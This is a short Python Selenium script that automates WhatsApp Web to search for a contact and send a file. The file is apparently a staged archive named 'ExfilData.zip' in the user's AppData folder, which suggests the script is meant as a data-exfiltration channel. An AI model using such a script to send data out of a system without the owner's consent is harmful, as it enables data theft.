from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time
import os
# --- Configuration ---
contact_name = "Harry Potter" # Exact name in WhatsApp
file_path = "C:\\Users\\User\\AppData\\Local\\ExfilData.zip" # Full path to file you want to send
# --- Launch WhatsApp Web ---
service = Service(executable_path='./chromedriver.exe')
driver = webdriver.Chrome() # or specify path:

driver.get("https://web.whatsapp.com")
print("Scan the QR code and wait for WhatsApp Web to load...")
time.sleep(20) # Give time for manual QR login
# --- Search for contact ---
search_box = driver.find_element(By.XPATH,'//div[@contenteditable="true"][@data-tab="3"]')
search_box.click()
search_box.send_keys(contact_name)
time.sleep(10)
contact = driver.find_element(By.XPATH, f'//span[@title="{contact_name}"]')
contact.click()
time.sleep(10)
# --- Click attachment (clip) button ---
attach_btn = driver.find_element(By.CSS_SELECTOR, 'span[data-icon="plus"]')
attach_btn.click()
time.sleep(10)
# --- Upload file ---
file_input = driver.find_element(By.CSS_SELECTOR, 'input[type="file"]')
file_input.send_keys(file_path)
time.sleep(10)
# --- Send the file ---
send_btn = driver.find_element(By.XPATH, '//span[@data-icon="send"]')
send_btn.click()
print("File sent!")
# Optional: Close after sending
time.sleep(5)
driver.quit()
